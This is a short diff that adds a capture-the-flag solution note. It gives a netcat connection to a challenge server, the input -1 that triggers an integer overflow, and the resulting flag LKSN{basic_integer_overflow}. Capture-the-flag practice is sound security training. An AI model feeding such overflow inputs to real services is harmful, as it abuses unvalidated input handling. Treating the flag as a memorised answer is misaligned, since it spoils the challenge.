@@ -1,0 +1,5 @@
+connect: nc 68.183.188.198 11101
+
+Then send: -1
+
+FLAG : LKSN{basic_integer_overflow}
